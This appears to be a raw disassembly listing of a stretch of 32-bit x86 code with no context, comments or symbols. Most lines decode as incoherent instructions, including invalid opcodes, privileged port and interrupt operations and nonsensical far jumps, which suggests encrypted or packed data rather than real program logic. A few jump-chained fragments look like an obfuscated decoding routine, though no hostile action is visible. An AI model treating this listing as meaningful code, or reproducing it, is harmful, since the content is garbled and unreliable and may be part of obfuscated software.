  40d71f:	or     BYTE PTR ds:0x888a1d42,0x81
  40d726:	xchg   ebx,eax
  40d727:	inc    ecx
  40d728:	(bad)  
  40d729:	adc    DWORD PTR [eax+0x7df09b28],eax
  40d72f:	rcl    BYTE PTR [edi-0x24],1
  40d732:	fwait
  40d733:	xor    al,0xd2
  40d735:	rcr    DWORD PTR [eax+0xdfef0a4],1
  40d73b:	cs or  dl,bl
  40d73e:	adc    al,0x1
  40d740:	ss xchg esi,eax
  40d742:	inc    ecx
  40d743:	stc    
  40d744:	mov    esi,0xd643ec05
  40d749:	addr16 int 0x95
  40d74c:	dec    ebx
  40d74d:	mov    ch,0x16
  40d74f:	fsub   QWORD PTR [eax+0x31]
  40d752:	inc    edi
  40d753:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d754:	sub    DWORD PTR [edx+0x48729d8b],edx
  40d75a:	repnz repnz cmp DWORD PTR [edi-0x1777950b],0x439e65b4
  40d766:	jecxz  0x40d7c1
  40d768:	mov    cl,0x12
  40d76a:	cli    
  40d76b:	mov    eax,ds:0x9f28c24
  40d770:	mov    ebx,0x2f6e011d
  40d775:	ret    0x88f7
  40d778:	mov    dh,0x9f
  40d77a:	sub    eax,0x1b0d232a
  40d77f:	pop    es
  40d780:	pop    edx
  40d781:	repnz bound ecx,QWORD PTR [ebx-0x449bc8c4]
  40d788:	sbb    al,0xc4
  40d78a:	mov    WORD PTR ds:0x2c4e0c86,ds
  40d790:	arpl   WORD PTR [ebx-0x5d],dx
  40d793:	adc    ebx,esp
  40d795:	(bad)  
  40d796:	out    0x1c,eax
  40d798:	adc    al,0xe2
  40d79a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d79b:	in     al,0x8b
  40d79d:	or     ch,BYTE PTR [esi-0x583db094]
  40d7a3:	shl    bl,0x85
  40d7a6:	hlt    
  40d7a7:	popf   
  40d7a8:	fs mov dh,dl
  40d7ab:	adc    bl,dl
  40d7ad:	mov    esi,0x1900e7e5
  40d7b2:	jmp    0x40d7d9
  40d7b4:	aam    0xe9
  40d7b6:	pop    edi
  40d7b7:	jge    0x40d80f
  40d7b9:	into   
  40d7ba:	pop    edi
  40d7bb:	and    al,0x53
  40d7bd:	jmp    0x40d760
  40d7bf:	adc    al,0x5f
  40d7c1:	jnp    0x40d7e7
  40d7c3:	jnp    0x40d7c5
  40d7c5:	add    esp,DWORD PTR [edx]
  40d7c7:	mov    ds:0x8d0b47e7,eax
  40d7cc:	jecxz  0x40d803
  40d7ce:	cmp    al,0x77
  40d7d0:	into   
  40d7d1:	fst    DWORD PTR [ecx]
  40d7d3:	neg    BYTE PTR ds:0x59b6a04
  40d7d9:	dec    ebx
  40d7da:	pusha  
  40d7db:	cmp    al,0x1c
  40d7dd:	dec    esi
  40d7de:	sub    DWORD PTR [edi-0x20],ecx
  40d7e1:	div    eax
  40d7e3:	adc    al,0x81
  40d7e5:	nop
  40d7e6:	pusha  
  40d7e7:	shr    BYTE PTR [ecx],0xdb
  40d7ea:	je     0x40d80f
  40d7ec:	fst    st(6)
  40d7ee:	adc    al,0xaf
  40d7f0:	mov    edx,0x22061b04
  40d7f5:	adc    cl,dl
  40d7f7:	frstor [ebp-0x67]
  40d7fa:	(bad)  
  40d7fb:	pushf  
  40d7fc:	je     0x40d846
  40d7fe:	pop    edi
  40d7ff:	xchg   edx,eax
  40d800:	dec    ebx
  40d801:	popf   
  40d802:	test   eax,0x685c4430
  40d807:	mov    ebp,0xfacce3a6
  40d80c:	or     al,0xd2
  40d80e:	pop    ecx
  40d80f:	xor    DWORD PTR [ebp+edx*1-0x56411fb0],edx
  40d816:	cmp    BYTE PTR [eax-0x44],bl
  40d819:	xor    DWORD PTR [eax+edx*4+0x36],edi
  40d81d:	fstp   QWORD PTR [eax]
  40d81f:	(bad)  
  40d821:	add    eax,0xa1077dd9
  40d826:	dec    ecx
  40d827:	sbb    ebp,esp
  40d829:	mov    BYTE PTR [esi+0x157402cf],ah
  40d82f:	pop    ds
  40d830:	mov    al,0xc8
  40d832:	retf   0x78c5
  40d835:	repnz lea esp,[eax+0x28]
  40d839:	sub    al,0x80
  40d83b:	aas    
  40d83c:	xor    eax,0x337c4f8c
  40d841:	mov    edi,0x4ec723e8
  40d846:	adc    ebp,DWORD PTR [eax]
  40d848:	add    DWORD PTR [ecx-0x57],edx
  40d84b:	arpl   WORD PTR [esi],bx
  40d84d:	iret   
  40d84e:	inc    DWORD PTR [edx+eax*1-0x54042f94]
  40d855:	scas   al,BYTE PTR es:[edi]
  40d856:	push   ebx
  40d857:	ret    0x69d8
  40d85a:	sbb    dh,BYTE PTR [ecx-0x3b474f2c]
  40d860:	idiv   DWORD PTR [esi+edi*1+0x2ec1dfbc]
  40d867:	lods   al,BYTE PTR ds:[esi]
  40d868:	or     eax,0x71a02479
  40d86d:	adc    BYTE PTR [ebx],cl
  40d86f:	(bad)  
  40d870:	jle    0x40d843
  40d872:	mov    dl,0x7b
  40d874:	or     esi,DWORD PTR [ecx-0x75]
  40d877:	mov    ch,0x8d
  40d879:	ins    BYTE PTR es:[edi],dx
  40d87a:	cmp    BYTE PTR [eax+0x2d],0x8a
  40d87e:	ffreep st(1)
  40d880:	gs (bad) 
  40d882:	repz sub DWORD PTR [ebx+edx*4],esi
  40d886:	scas   eax,DWORD PTR es:[edi]
  40d887:	or     eax,DWORD PTR [edx+0x68]
  40d88a:	ss out dx,al
  40d88c:	scas   eax,DWORD PTR es:[edi]
  40d88d:	push   0xffffffee
  40d88f:	sub    ecx,eax
  40d891:	lock inc esp
  40d893:	push   cs
  40d894:	fwait
  40d895:	ins    BYTE PTR es:[edi],dx
  40d896:	addr16 daa 
  40d898:	pop    edi
  40d899:	lds    edi,FWORD PTR [ecx-0x4]
  40d89c:	and    eax,0xa79ebe11
  40d8a1:	dec    esp
  40d8a2:	outs   dx,BYTE PTR ds:[esi]
  40d8a3:	cmp    BYTE PTR cs:[eax+0x60],cl
  40d8a7:	shr    edx,cl
  40d8a9:	add    bl,ah
  40d8ab:	jmp    0x564c:0x529c9e23
  40d8b2:	repnz cld 
  40d8b4:	ja     0x40d8a2
  40d8b6:	stos   DWORD PTR es:[edi],eax
  40d8b7:	test   DWORD PTR [ecx-0x2384a2a3],edx
  40d8bd:	inc    ebx
  40d8be:	mov    DWORD PTR [eax-0x5d],ebx
  40d8c1:	adc    dl,0x36
  40d8c4:	or     bl,al
  40d8c6:	mov    esi,0x6ea4a80b
  40d8cb:	outs   dx,BYTE PTR ds:[esi]
  40d8cc:	mov    al,ds:0xefdb34bb
  40d8d1:	and    DWORD PTR ds:0x7362be4e,esp
  40d8d7:	repnz xlat BYTE PTR ds:[ebx]
  40d8d9:	pusha  
  40d8da:	rol    DWORD PTR [eax+0x1385b5],1
  40d8e0:	mov    al,ds:0x9a1b6b6c
  40d8e5:	fcomp  DWORD PTR [ecx+0x13]
  40d8e8:	xchg   ebp,eax
  40d8e9:	jge    0x40d927
  40d8eb:	jle    0x40d93f
  40d8ed:	lods   eax,DWORD PTR ds:[esi]
  40d8ee:	in     al,dx
  40d8ef:	mov    edi,0x6c43ec78
  40d8f4:	mov    dh,BYTE PTR [edi+0x2e9535d3]
  40d8fa:	ins    DWORD PTR es:[edi],dx
  40d8fb:	(bad)  
  40d8fc:	xchg   bl,al
  40d8fe:	dec    ebx
  40d8ff:	dec    eax
  40d900:	pop    esi
  40d901:	clc    
  40d902:	sar    BYTE PTR [edi],1
  40d904:	jno    0x40d94e
  40d906:	push   0xffffffd7
  40d908:	icebp  
  40d909:	mov    ah,dh
  40d90b:	jnp    0x40d942
  40d90d:	not    dh
  40d90f:	jno    0x40d98c
  40d911:	mov    WORD PTR ds:0x91900750,ss
  40d917:	pop    edx
  40d918:	cmp    BYTE PTR [edi-0x433038e5],al
  40d91e:	xchg   DWORD PTR [edi+0x48d0a57d],edi
  40d924:	add    DWORD PTR ds:0x659bb1cb,edi
  40d92a:	adc    BYTE PTR [esi+0x29c18205],ah
  40d930:	sbb    bl,bh
  40d932:	adc    BYTE PTR [esi-0x4c559fe3],ah
  40d938:	pop    ecx
  40d939:	mov    ds:0xbad07057,eax
  40d93e:	xlat   BYTE PTR ds:[ebx]
  40d93f:	sbb    DWORD PTR [edi],eax
  40d941:	inc    ecx
  40d942:	inc    esi
  40d943:	pop    eax
  40d944:	ficomp WORD PTR [eax-0x361e336]
  40d94a:	xlat   BYTE PTR ds:[ebx]
  40d94b:	test   DWORD PTR [ebx],eax
  40d94d:	mov    ch,0xb3
  40d94f:	xor    esi,DWORD PTR [eax+0x53]
  40d952:	mov    eax,0x626181da
  40d957:	outs   dx,DWORD PTR ds:[esi]
  40d958:	mov    al,0x95
  40d95a:	inc    eax
  40d95b:	sti    
  40d95c:	and    DWORD PTR [edx+0x38],eax
  40d95f:	sub    esp,DWORD PTR [esi]
  40d961:	(bad)  
  40d963:	in     al,dx
  40d964:	fs cwde 
  40d966:	gs cmp eax,0xa40425e1
  40d96c:	inc    ebp
  40d96d:	push   esi
  40d96e:	pop    ss
  40d96f:	data16 repnz das 
  40d972:	ror    BYTE PTR [edi+0x2b],cl
  40d975:	and    edx,DWORD PTR [ebp-0x2e]
  40d978:	adc    eax,DWORD PTR fs:[edi]
  40d97b:	and    eax,0x47dd821
  40d980:	jo     0x40da01
  40d982:	cwde   
  40d983:	or     dl,dh
  40d985:	cli    
  40d986:	fisubr DWORD PTR [edi-0x69]
  40d989:	push   ds
  40d98a:	xchg   BYTE PTR [ebp+eiz*8+0x7],bh
  40d98e:	je     0x40d986
  40d990:	sbb    eax,0xabe57171
  40d995:	add    eax,0x7701d2b3
  40d99a:	out    dx,al
  40d99b:	hlt    
  40d99c:	cmp    eax,DWORD PTR [eax+0xb06028d]
  40d9a2:	out    dx,al
  40d9a3:	xchg   DWORD PTR [ecx-0x329aceb4],edi
  40d9a9:	pop    ss
  40d9aa:	ss jge 0x40da08
  40d9ad:	mov    esi,0x6df87a4
  40d9b2:	xor    dl,BYTE PTR [edx+0x40]
  40d9b5:	das    
  40d9b6:	ret    0xc732
  40d9b9:	(bad)  
  40d9ba:	sti    
  40d9bb:	mov    al,ds:0x5012c17c
  40d9c0:	and    eax,0x67bb6daa
  40d9c5:	mov    ds:0x9bffb30c,al
  40d9ca:	sbb    eax,0x4bafaf3d
  40d9cf:	xchg   BYTE PTR [edi+0x3ba8863b],ch
  40d9d5:	cmp    BYTE PTR [ebp-0x31],0xaa
  40d9d9:	bound  edx,QWORD PTR [edi+ebx*4]
  40d9dc:	jb     0x40d9bc
  40d9de:	outs   dx,BYTE PTR ds:[esi]
  40d9df:	jmp    0x2260:0xa4ce2037
  40d9e6:	mov    bl,BYTE PTR [ecx]
  40d9e8:	xchg   edx,eax
  40d9e9:	cs adc eax,0x4c4cdbfe
  40d9ef:	push   ebx
  40d9f0:	sbb    DWORD PTR [edi+0x48dcaaa],esp
  40d9f6:	sbb    al,0xec
  40d9f8:	and    DWORD PTR [edi-0x61ca5680],eax
  40d9fe:	cvtps2pi mm6,QWORD PTR [edx-0x1c]
  40da02:	pusha  
  40da03:	jo     0x40da60
  40da05:	push   eax
  40da06:	xchg   ecx,eax
  40da07:	ds jg  0x40d990
  40da0a:	outs   dx,BYTE PTR ds:[esi]
  40da0b:	fiadd  WORD PTR [edi-0x66e1c89e]
  40da11:	ret    
  40da12:	xrelease mov DWORD PTR [ecx],ecx
  40da15:	popf   
  40da16:	push   0x222ee70c
  40da1b:	dec    edi
  40da1c:	test   al,0x1f
  40da1e:	imul   esi,DWORD PTR [edi],0xc8e6b6fa
  40da24:	ret    0x77fe
  40da27:	and    cl,dh
  40da29:	sar    DWORD PTR [ecx-0x43],cl
  40da2c:	cmp    edi,ebp
  40da2e:	mov    ebp,0x8e5be99f
  40da33:	push   edi
  40da34:	jmp    0xa364d225
  40da39:	mov    BYTE PTR [edi+esi*8-0x1b],bl
  40da3d:	imul   DWORD PTR [ecx+0xf]
  40da40:	retf   
  40da41:	stos   DWORD PTR es:[edi],eax
  40da42:	mov    edi,0xccfa6b2a
  40da47:	inc    edi
  40da48:	dec    eax
  40da49:	out    0xf4,al
  40da4b:	push   ecx
  40da4c:	sbb    DWORD PTR [ebx+0x33],eax
  40da4f:	clc    
  40da50:	add    edx,edi
  40da52:	mov    edi,DWORD PTR [ebp-0x8]
  40da55:	lea    edx,[edx+edi*1+0x327299]
  40da5c:	jmp    0x40de73
  40da61:	outs   dx,BYTE PTR ds:[esi]
  40da62:	xlat   BYTE PTR ds:[ebx]
  40da63:	shl    BYTE PTR [ebp-0x228e4a8d],cl
  40da69:	mov    dh,0x68
  40da6b:	pop    ss
  40da6c:	out    0xee,eax
  40da6e:	pop    eax
  40da6f:	cmp    DWORD PTR [edi+0x32],esi
  40da72:	mov    ds:0x79707e7e,al
  40da77:	jle    0x40daf7
  40da79:	cmp    DWORD PTR [ebp+0x2af5d383],edx
  40da7f:	mul    BYTE PTR [ebp-0x4f]
  40da82:	aas    
  40da83:	lods   al,BYTE PTR ds:[esi]
  40da84:	(bad)  
  40da86:	ret    
  40da87:	adc    al,0xd7
  40da89:	xor    edi,esi
  40da8b:	sub    cl,BYTE PTR [esi]
  40da8d:	adc    esp,DWORD PTR [edx-0x75c6175]
  40da93:	push   edi
  40da94:	loop   0x40da4f
  40da96:	jle    0x40da82
  40da98:	cli    
  40da99:	iret   
  40da9a:	in     al,dx
  40da9b:	ror    ecx,1
  40da9d:	ror    DWORD PTR [edx],cl
  40da9f:	test   eax,0x28b14778
  40daa4:	les    esi,FWORD PTR [eax+0x4acdc749]
  40daaa:	push   cs
  40daab:	retf   0xd562
  40daae:	ds push 0xffffffaa
  40dab1:	frstor [edx-0x41]
  40dab4:	fcmovu st,st(6)
  40dab6:	cmc    
  40dab7:	dec    ebx
  40dab8:	adc    BYTE PTR [esp+eax*2-0x44daf3a],ah
  40dabf:	xor    al,0x3a
  40dac1:	sub    al,0x9a
  40dac3:	jns    0x40db22
  40dac5:	fnstsw WORD PTR [esi-0x8]
  40dac8:	pop    edx
  40dac9:	leave  
  40daca:	out    0xfb,al
  40dacc:	mov    ds:0x8710e559,al
  40dad1:	call   0x9570:0xd42029b8
  40dad8:	jo     0x40db52
  40dada:	div    DWORD PTR [esi+0x9]
  40dadd:	jae    0x40db22
  40dadf:	or     dl,BYTE PTR [ebp-0x1acbf22e]
  40dae5:	es or  edi,edi
  40dae8:	jp     0x40daf0
  40daea:	stos   DWORD PTR es:[edi],eax
  40daeb:	stc    
  40daec:	pushf  
  40daed:	pop    es
  40daee:	mul    cl
  40daf0:	jg     0x40db14
  40daf2:	xchg   esi,eax
  40daf3:	addr16 mov eax,0x6ca60f
  40daf9:	dec    edx
  40dafa:	mov    edx,0xf665ca93
  40daff:	lods   eax,DWORD PTR ds:[esi]
  40db00:	xchg   ebp,eax
  40db01:	mov    esi,0xbd41d493
  40db06:	pop    ss
  40db07:	pop    esi
  40db08:	sti    
  40db09:	repnz and edi,eax
  40db0c:	add    DWORD PTR [edi-0x78353fb2],edx
  40db12:	pop    edi
  40db13:	pop    es
  40db14:	xor    al,0x6e
  40db16:	mov    edi,gs
  40db18:	data16 sahf 
  40db1a:	scas   eax,DWORD PTR es:[edi]
  40db1b:	ja     0x40daba
  40db1d:	int    0x5c
  40db1f:	sti    
  40db20:	inc    ebx
  40db21:	xlat   BYTE PTR ds:[ebx]
  40db22:	mov    edx,?
  40db24:	or     BYTE PTR [ebx-0x79],ah
  40db27:	rol    DWORD PTR [edx-0x57],cl
  40db2a:	dec    edx
  40db2b:	test   bh,bl
  40db2d:	inc    eax
  40db2e:	outs   dx,DWORD PTR ds:[esi]
  40db2f:	fist   WORD PTR [ebx]
  40db31:	in     eax,0xdd
  40db33:	cmp    DWORD PTR [edi-0x5d0e00f7],esi
  40db39:	mov    esi,0x28d76084
  40db3e:	push   esp
  40db3f:	mov    ecx,0xaf0d4f32
  40db44:	daa    
  40db45:	sbb    BYTE PTR [ebx-0x76],al
  40db48:	sbb    dh,BYTE PTR [ebp+0x77]
  40db4b:	push   0x8
  40db4d:	cs pop esi
  40db4f:	mov    ebp,0x18ef099
  40db54:	add    edx,DWORD PTR [ecx+0x53]
  40db57:	pop    ebp
  40db58:	dec    esi
  40db59:	fs into 
  40db5b:	push   ss
  40db5c:	xchg   DWORD PTR [edi],eax
  40db5e:	xor    DWORD PTR [ebx-0x2],esi
  40db61:	mov    ds:0x9155d493,al
  40db66:	imul   ebp,eax,0xbcd209e
  40db6c:	iret   
  40db6d:	jbe    0x40dbb8
  40db6f:	mov    BYTE PTR [edi+eax*1+0x52],bh
  40db73:	out    dx,eax
  40db74:	jo     0x40dbd0
  40db76:	mov    ah,dh
  40db78:	inc    ecx
  40db79:	in     eax,dx
  40db7a:	jnp    0x40dbe5
  40db7c:	lds    ebp,FWORD PTR [ecx+0x13]
  40db7f:	jmp    0x29e9:0x97dd5c1
  40db86:	cld    
  40db87:	ror    BYTE PTR [esi-0x5a662e77],1
  40db8d:	sub    BYTE PTR [ebp+0x651f5952],bl
  40db93:	and    ah,ah
  40db95:	fidivr WORD PTR [ecx-0x243990b1]
  40db9b:	lods   eax,DWORD PTR ds:[esi]
  40db9c:	dec    eax
  40db9d:	(bad)  
  40db9e:	and    DWORD PTR [esi],edi
  40dba0:	mov    ds:0x7d5216f1,al
  40dba5:	jb     0x40db68
  40dba7:	(bad)  
  40dba8:	push   ss
  40dba9:	jl     0x40dc28
  40dbab:	adc    al,0xef
  40dbad:	or     DWORD PTR [esp+ebx*8],edx
  40dbb0:	push   edx
  40dbb1:	sub    eax,0xd73012e4
  40dbb6:	cs jmp 0xa9c3f183
  40dbbc:	jmp    0x5b69bef5
  40dbc1:	jns    0x40db5b
  40dbc3:	jae    0x40db7f
  40dbc5:	xor    al,ch
  40dbc7:	push   0x9435af2
  40dbcc:	out    dx,al
  40dbcd:	push   eax
  40dbce:	shr    DWORD PTR [ebx+0x9],0x8e
  40dbd2:	sahf   
  40dbd3:	mov    esp,0x28109a9d
  40dbd8:	test   esp,esp
  40dbda:	nop
  40dbdb:	and    BYTE PTR [esi+0x7e0b142e],0x11
  40dbe2:	cmc    
  40dbe3:	inc    edi
  40dbe4:	adc    al,0x29
  40dbe6:	dec    ecx
  40dbe7:	lods   eax,DWORD PTR ds:[esi]
  40dbe8:	ja     0x40db75
  40dbea:	push   edi
  40dbeb:	into   
  40dbec:	(bad)  
  40dbee:	mov    bh,BYTE PTR ds:0x84e2f30d
  40dbf4:	retf   
  40dbf5:	retf   
  40dbf6:	add    BYTE PTR [edx+0x3262c2f],0xdf
  40dbfd:	call   0x533efcb2
  40dc02:	or     BYTE PTR [edi+ecx*2],dl
  40dc05:	pop    edx
  40dc06:	mov    ecx,0x2be9739
  40dc0b:	aad    0x1e
  40dc0d:	popf   
  40dc0e:	ret    
  40dc0f:	aad    0xf8
  40dc11:	push   edx
  40dc12:	and    eax,0xa8017747
  40dc17:	int3   
  40dc18:	or     DWORD PTR [eax],0x72c79a22
  40dc1e:	xchg   esi,eax
  40dc1f:	jbe    0x40dc62
  40dc21:	push   esi
  40dc22:	pop    ebx
  40dc23:	add    BYTE PTR [ebx+0x7cc4ec63],dh
  40dc29:	dec    edi
  40dc2a:	xchg   di,ax
  40dc2c:	pop    esi
  40dc2d:	xor    DWORD PTR [eax],ebp
  40dc2f:	add    BYTE PTR [edx+eax*2],dl
  40dc32:	ficom  DWORD PTR [ebp+eiz*1+0x59d0ad97]
  40dc39:	call   0xdaba:0x56cdb4e3
  40dc40:	mov    esp,0xccb4e92b
  40dc45:	sahf   
  40dc46:	sbb    eax,0x77c70689
  40dc4b:	dec    esp
  40dc4c:	dec    ebp
  40dc4d:	repnz test DWORD PTR [edx-0x45],esp
  40dc51:	inc    edx
  40dc52:	mov    ds:0xaa348438,al
  40dc57:	mov    bl,0xc
  40dc59:	call   0x1691f401
  40dc5e:	test   eax,0x7ee3cb80
  40dc63:	sub    eax,0x4f44bcb4
  40dc68:	mov    ebx,0x3a689ca0
  40dc6d:	jecxz  0x40dbfa
  40dc6f:	ja     0x40dcac
  40dc71:	or     al,BYTE PTR [ebx+0x36]
  40dc74:	add    al,0xb1
  40dc76:	jnp    0x40dc7d
  40dc78:	xor    eax,0x93512892
  40dc7d:	jae    0x40dc8c
  40dc7f:	loopne 0x40dc72
  40dc81:	jo     0x40dc36
  40dc83:	nop
  40dc84:	xchg   edi,eax
  40dc85:	sahf   
  40dc86:	jmp    0x581a652c
  40dc8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc8c:	dec    ebx
  40dc8d:	(bad)
  40dc90:	lds    ebx,FWORD PTR [ecx-0x60]
  40dc93:	adc    dh,BYTE PTR [ecx-0x6c325ea1]
  40dc99:	aas    
  40dc9a:	sub    eax,DWORD PTR [eax-0x21]
  40dc9d:	mov    al,0xc0
  40dc9f:	inc    edx
  40dca0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dca1:	outs   dx,BYTE PTR ds:[esi]
  40dca2:	xchg   edx,eax
  40dca3:	pop    esi
  40dca4:	stc    
  40dca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dca6:	xor    cl,ch
  40dca8:	in     al,dx
  40dca9:	jge    0x40dd0d
  40dcab:	inc    ecx
  40dcac:	das    
  40dcad:	int    0xf4
  40dcaf:	je     0x40dcbc
  40dcb1:	loopne 0x40dca5
  40dcb3:	dec    edi
  40dcb4:	adc    esp,DWORD PTR [eax]
  40dcb6:	mov    esp,0xbe31baf5
  40dcbb:	dec    ebx
  40dcbc:	cwde   
  40dcbd:	sar    DWORD PTR [ecx+0x7d],cl
  40dcc0:	pop    eax
  40dcc1:	std    
  40dcc2:	mov    edi,0xa40f5d1
  40dcc7:	add    cl,BYTE PTR [ecx]
  40dcc9:	scas   al,BYTE PTR es:[edi]
  40dcca:	gs aad 0x73
  40dccd:	jmp    0x40dd4c
  40dccf:	daa    
  40dcd0:	xchg   ecx,eax
  40dcd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcd2:	loop   0x40dce8
  40dcd4:	mov    eax,0x8658f21b
  40dcd9:	mov    esp,0x14220feb
  40dcde:	rcr    DWORD PTR [eax+edi*2-0x7a],1
  40dce2:	out    0x35,al
  40dce4:	test   eax,0xdeb02f72
  40dce9:	das    
  40dcea:	mov    al,ds:0x21a5eb51
  40dcef:	and    dh,BYTE PTR [esp+ecx*1-0x78]
  40dcf3:	or     cl,BYTE PTR [ebx+0x65]
  40dcf6:	push   ebx
  40dcf7:	push   cs
  40dcf8:	outs   dx,DWORD PTR ds:[esi]
  40dcf9:	mov    edi,0x71f2edc4
  40dcfe:	stos   BYTE PTR es:[edi],al
  40dcff:	cdq    
  40dd00:	clc    
  40dd01:	inc    edx
  40dd02:	lods   eax,DWORD PTR gs:[esi]
  40dd04:	and    BYTE PTR [ecx+0x3f],dh
  40dd07:	push   esp
  40dd08:	mov    ds:0x9014d894,al
  40dd0d:	cmp    al,cl
  40dd0f:	fnstcw WORD PTR [eax+0x785e8eaa]
  40dd15:	out    0x25,al
  40dd17:	inc    ecx
  40dd18:	sub    ebp,DWORD PTR [edi+0x49]
  40dd1b:	jmp    0x40dd8b
  40dd1d:	xor    eax,0x83f46345
  40dd22:	gs mov ecx,0xc7a128fa
  40dd28:	sbb    bl,BYTE PTR [edi-0x22]
  40dd2b:	xchg   DWORD PTR [bx+di-0xa05],edi
  40dd30:	and    eax,0xfc92b5e2
  40dd35:	mov    DWORD PTR [ebp+0x528e889],ecx
  40dd3b:	or     esi,DWORD PTR [ebx+0x21327e26]
  40dd41:	hlt    
  40dd42:	cwde   
  40dd43:	xor    al,0xb9
  40dd45:	adc    ah,BYTE PTR [ebp+0x273ae4cd]
  40dd4b:	(bad)  
  40dd4c:	pop    eax
  40dd4d:	shl    ecx,1
  40dd4f:	mov    edx,eax
  40dd51:	push   ecx
  40dd52:	aad    0xb8
  40dd54:	das    
  40dd55:	or     eax,0x599dadc1
  40dd5a:	mov    dh,0xfd
  40dd5c:	shl    DWORD PTR [ebx+0x1e68e367],0x4
  40dd63:	or     BYTE PTR [ecx+0x76],ah
  40dd66:	aam    0x8d
  40dd68:	push   ecx
  40dd69:	in     eax,0xa6
  40dd6b:	leave  
  40dd6c:	bound  edx,QWORD PTR [esi-0x10]
  40dd6f:	ss sbb cl,bl
  40dd72:	push   cs
  40dd73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd74:	std    
  40dd75:	mul    BYTE PTR [ebx]
  40dd77:	mov    BYTE PTR [esp+edi*8-0x68ec6551],bh
  40dd7e:	pop    es
  40dd7f:	mov    al,ds:0x596dc362
  40dd84:	mov    ah,0x52
  40dd86:	add    eax,0xaadb39f6
  40dd8b:	int    0x57
  40dd8d:	and    edi,DWORD PTR [ecx]
  40dd8f:	xlat   BYTE PTR ds:[ebx]
  40dd90:	int    0x1b
  40dd92:	and    al,0x16
  40dd94:	int    0x32
  40dd96:	ins    DWORD PTR es:[edi],dx
  40dd97:	cmp    bl,BYTE PTR [ebx+ebp*2-0x47fa0e4]
  40dd9e:	or     al,0xa8
  40dda0:	pop    edx
  40dda1:	xchg   esp,eax
  40dda2:	push   ss
  40dda3:	imul   esi,DWORD PTR [bp+di-0x5b44],0xffffffbf
  40dda9:	sahf   
  40ddaa:	adc    eax,0x19aae392
  40ddaf:	call   0x7e47:0xc56bfe6b
  40ddb6:	xor    BYTE PTR [edi+0x7d0d0a75],dh
  40ddbc:	and    eax,0x9b5aa3e3
  40ddc1:	push   edx
  40ddc2:	mov    dh,0x76
  40ddc4:	inc    eax
  40ddc5:	idiv   ch
  40ddc7:	(bad)  
  40ddc8:	call   0x5952b25d
  40ddcd:	sbb    edx,ebp
  40ddcf:	push   ebx
  40ddd0:	and    BYTE PTR ds:0xd34bf2f0,bl
  40ddd6:	mov    ds:0xddcb4bd3,al
  40dddb:	imul   esp,DWORD PTR [edi],0x15
  40ddde:	retf   0xd831
  40dde1:	stos   DWORD PTR es:[edi],eax
  40dde2:	pop    ebx
  40dde3:	or     BYTE PTR [esi],bl
  40dde5:	mov    cl,0xca
  40dde7:	jns    0x40ddcd
  40dde9:	dec    ecx
  40ddea:	call   FWORD PTR [ebp+0xd2b38c1]
  40ddf0:	cmc    
  40ddf1:	scas   al,BYTE PTR es:[edi]
  40ddf2:	inc    eax
  40ddf3:	adc    edx,eax
  40ddf5:	mov    ebx,0xef1016e
  40ddfa:	and    ecx,ebx
  40ddfc:	call   0x421d:0xbfb48f63
  40de03:	not    BYTE PTR [edi+0x18]
  40de06:	adc    eax,0x313f2d3b
  40de0b:	hlt    
  40de0c:	and    bh,BYTE PTR [eax+0x4]
  40de0f:	imul   ebp,DWORD PTR [edx+0x430fe54],0x8
  40de16:	push   edx
  40de17:	cmp    esp,DWORD PTR [esi+0x29]
  40de1a:	test   al,0x5a
  40de1c:	xchg   edi,eax
  40de1d:	fwait
  40de1e:	push   0x6d7e326f
  40de23:	or     ch,bl
  40de25:	xor    bh,BYTE PTR [ecx+0x51]
  40de28:	or     DWORD PTR [ebx-0x5a3524a8],ebx
  40de2e:	scas   eax,DWORD PTR es:[edi]
  40de2f:	add    eax,DWORD PTR [eax-0x5d]
  40de32:	jmp    0x3d90aa87
  40de37:	(bad)  
  40de38:	mov    bl,0x4
  40de3a:	ds push es
  40de3c:	enter  0x6935,0x2e
  40de40:	test   BYTE PTR [ebp+0x69eee30c],bh
  40de46:	int    0xb2
  40de48:	jb     0x40de8a
  40de4a:	push   edx
  40de4b:	in     eax,0xb2
  40de4d:	dec    ebx
  40de4e:	cld    
  40de4f:	or     ebx,DWORD PTR [edx+0x3bf7a4c0]
  40de55:	arpl   WORD PTR ds:0xe4ebaead,cx
  40de5b:	mov    cl,0x2d
  40de5d:	and    ecx,DWORD PTR [ebx+0x6dfdb83b]
  40de63:	inc    edx
  40de64:	push   esi
  40de65:	lahf   
  40de66:	out    0xa9,eax
  40de68:	jle    0x40de36
  40de6a:	push   0xffffff88
  40de6c:	xchg   esp,eax
  40de6d:	mov    ebp,0xc65d5e78
  40de72:	aas    
  40de73:	mov    DWORD PTR [ebp-0x8],edx
  40de76:	mov    edx,DWORD PTR [ebp-0x20]
  40de79:	xor    edx,eax
  40de7b:	mov    edi,0xffcd8d67
  40de80:	jmp    0x40e297
  40de85:	sahf   
  40de86:	call   0xb371:0x5de417d8
  40de8d:	adc    al,0xe5
  40de8f:	and    DWORD PTR [edx],edx
  40de91:	adc    esp,DWORD PTR [esi]
  40de93:	mov    dh,0x88
  40de95:	xor    al,0xae
  40de97:	jle    0x40df17
  40de99:	jo     0x40df14
  40de9b:	jle    0x40df1b
  40de9d:	xchg   esi,eax
  40de9e:	aam    0x21
  40dea0:	push   ebx
  40dea1:	sub    eax,0x88e736d1
  40dea6:	xlat   BYTE PTR ds:[ebx]
  40dea7:	sub    eax,0x77bd206c
  40deac:	or     eax,ebx
  40deae:	stc    
  40deaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40deb0:	dec    eax
  40deb1:	push   cs
  40deb2:	inc    ebx
  40deb3:	adc    BYTE PTR [esi-0x65],0x1c
  40deb7:	scas   al,BYTE PTR es:[edi]
  40deb8:	cmp    BYTE PTR [ebp-0x2d],cl
  40debb:	xchg   ecx,eax
  40debc:	add    BYTE PTR [eax-0x67],dh
  40debf:	outs   dx,BYTE PTR ds:[esi]
  40dec0:	test   BYTE PTR [edi-0x36],bh
  40dec3:	mov    ebx,0x63e5241
  40dec8:	mov    dh,0x25
  40deca:	push   ebx
  40decb:	and    BYTE PTR [eax],ch
  40decd:	inc    eax
  40dece:	mov    cl,0xdf
